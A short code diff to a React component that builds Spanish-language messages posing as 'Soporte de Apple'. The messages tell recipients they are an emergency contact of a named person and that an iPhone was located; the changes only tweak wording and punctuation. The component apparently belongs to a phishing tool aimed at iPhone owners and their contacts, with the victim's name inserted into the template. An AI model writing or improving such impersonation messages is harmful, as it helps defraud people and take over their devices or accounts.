@@ -216,7 +216,7 @@ const ProcessList: React.FC<ProcessListProps> = ({ userType }) => {
         if (process.owner_name) {
           message = `*Soporte de Apple 👨🏽‍🔧*
 
-*🚨 Eres un contacto de emergencia de ${process.owner_name}*
+*🚨 Eres un contacto de emergencia ${process.owner_name}*
 
 *✅ iPhone localizado con éxito*
 
@@ -230,7 +230,7 @@ const ProcessList: React.FC<ProcessListProps> = ({ userType }) => {
         } else {
           message = `*Soporte de Apple 👨🏽‍🔧*
 
-*🚨 Eres un contacto de emergencia.*
+*🚨 Eres un contacto de emergencia*
 
 *✅ iPhone localizado con éxito*
 
